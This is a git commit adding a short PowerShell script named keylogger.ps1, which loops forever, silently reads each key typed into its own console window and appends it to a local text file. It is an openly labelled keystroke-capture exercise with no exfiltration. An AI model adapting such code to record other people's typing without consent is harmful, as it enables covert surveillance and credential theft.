bf2ac3a07cb5ba411431312ae23b4ad65f9e895d
Joseph Leroux <41457887+JosephLerouxBook@users.noreply.github.com>
2020-08-14 16:15:01 +0200

    Add files via upload
    Launch it inside the powershell console 
    /!\ NOT THE ISE

---
+++ keylogger.ps1
@@ -0,0 +1,13 @@
+﻿#chemin vers le fichier où est stocker ce qui est écrit
+$path = "W:\Pole_STS\unite_SPT\Apprenti\joseph\Scripts & Developpement\Keylogger\test.txt"
+
+while (1) {
+    if ([Console]::KeyAvailable){
+        # read the key, and consume it so it won't
+        # be echoed to the console:
+        $keyInfo = [Console]::ReadKey($true)
+        $output = $keyInfo.KeyChar
+        # exit loop
+        Add-Content -path $path $output -NoNewline
+    }
+}
